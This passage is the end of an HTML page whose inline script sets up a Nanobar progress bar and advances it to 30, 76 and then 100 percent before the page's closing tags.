    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>